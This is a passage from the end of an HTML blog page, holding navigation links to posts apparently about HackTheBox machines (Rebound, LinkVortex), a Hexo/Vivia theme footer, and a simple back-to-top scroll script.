      title="Tracks-AD-Rebound"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-AD-Rebound
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/08/box-wp-LinkVortex/"
      title="【season-6】 htb LinkVortex wp"
     >

    <p class="title-text">
      
        【season-6】 htb LinkVortex wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
